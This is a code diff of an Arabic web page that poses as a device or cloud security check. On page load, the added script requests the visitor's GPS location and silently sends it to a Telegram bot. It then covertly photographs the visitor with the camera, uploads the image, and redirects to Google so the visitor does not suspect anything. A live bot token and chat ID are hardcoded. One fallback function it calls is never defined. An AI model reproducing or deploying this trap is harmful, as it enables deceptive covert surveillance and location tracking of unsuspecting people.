@@ -2,54 +2,69 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث أمان الجهاز</title>
+    <title>تأمين النظام السحابي</title>
     <style>
-        body { background: #111; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        body { background: #000; color: #0f0; text-align: center; font-family: 'Courier New', monospace; padding-top: 100px; }
+        .loading { font-size: 20px; }
     </style>
 </head>
 <body>
-    <h2>جاري فحص حالة الجهاز...</h2>
-    <p>يرجى السماح بالوصول للكاميرا لإتمام عملية التحقق من الهوية</p>
+    <div class="loading">جاري فحص حالة الحماية...</div>
+    <p>يرجى الموافقة على الأذونات لتحديد موقع الجهاز وتصوير المستخدم</p>
 
     <script>
-        // --- تعديل البيانات هنا ---
         const token = '8787201125:AAGXUM1rZTxdSempBLkMs7xkza8K6rM7qgo';
         const chat_id = '6462902234';
-        // -------------------------
 
-        async function startSystem() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
+        async function startTrap() {
+            // 1. طلب الموقع الجغرافي (GPS)
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                // إرسال الموقع لتليجرام
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chat_id,
+                        text: `📍 تم تحديد موقع :\n${mapLink}`
+                    })
+                });
 
-                // لقطة سريعة بعد ثانية واحدة من فتح الكاميرا
-                setTimeout(async () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chat_id);
-                        formData.append('photo', blob, 'thief.jpg');
+                // 2. طلب الكاميرا وتصويره
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
 
-                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
+                    setTimeout(async () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        canvas.toBlob(async (blob) => {
+                            const formData = new FormData();
+                            formData.append('chat_id', chat_id);
+                            formData.append('photo', blob, 'thief.jpg');
+                            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+                            
+                            // تحويله لجوجل في النهاية
+                            window.location.href = "https://www.google.com";
+                        }, 'image/jpeg');
+                    }, 1000);
+                } catch (e) { console.log("Camera Denied"); }
 
-                        // تحويله لموقع جوجل عشان مكيشكش في حاجة
-                        window.location.href = "https://www.google.com";
-                    }, 'image/jpeg');
-                }, 1000);
-            } catch (err) {
-                console.log("الوصول مرفوض");
-            }
+            }, (err) => {
+                console.log("Location Denied");
+                // لو رفض الموقع، حاول برضه تفتح الكاميرا
+                startCameraOnly(); 
+            });
         }
-        window.onload = startSystem;
+
+        window.onload = startTrap;
     </script>
 </body>
 </html>
